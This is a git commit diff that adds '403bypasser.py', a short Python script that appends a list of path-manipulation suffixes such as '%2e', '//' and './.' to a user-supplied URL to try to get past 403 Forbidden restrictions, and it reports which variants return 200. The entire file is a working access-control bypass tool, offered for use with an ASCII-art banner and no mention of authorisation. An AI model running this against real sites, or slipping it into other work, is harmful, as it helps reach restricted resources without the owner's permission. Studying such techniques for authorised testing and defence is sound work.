5e8c028ec547d212ecade670907ed91312f34143
Aydın Baran Ertemir <64380389+baranertemir@users.noreply.github.com>
2021-02-09 12:10:25 +0300

    Add files via upload

---
+++ 403bypasser.py
@@ -0,0 +1,33 @@
+# -*- coding: utf-8 -*-
+# 09.02.2021
+
+try:
+    import requests,argparse
+except:
+    print("There are libraries that have not been downloaded.")
+    
+def banner():
+    print("""
+ | || |  / _ \___ \  |  _ \                                     
+ | || |_| | | |__) | | |_) |_   _ _ __   __ _ ___ ___  ___ _ __ 
+ |__   _| | | |__ <  |  _ <| | | | '_ \ / _` / __/ __|/ _ \ '__|
+    | | | |_| |__) | | |_) | |_| | |_) | (_| \__ \__ \  __/ |     - Aydin Baran Ertemir
+    |_|  \___/____/  |____/ \__, | .__/ \__,_|___/___/\___|_|     - 403 Bypasser
+                             __/ | |                              
+                            |___/|_|
+          """)
+banner()    
+bypass = ["%2e",".","?","??","//","./","/","*/","*","./.","././"]
+
+parser = argparse.ArgumentParser(description="A.Baran Ertemir | 403 Forbidden Bypass Script")
+parser.add_argument("-u","--url",required=True,type=str,help="Please give me the URL to bypass.")
+args = parser.parse_args()
+
+for i in bypass:
+    r = requests.get(args.url+"/"+i)
+    if r.status_code == 200:
+        print(r.status_code,"OK, IT'S ACCESIBLE [+]","|",args.url+"/"+i)
+    elif r.status_code == 403:
+        print(r.status_code,"OH, FORBIDDEN [-]","|",args.url+"/"+i)
+    else:
+        print("Not 200 or 403","Status Code:",r.status_code,"")
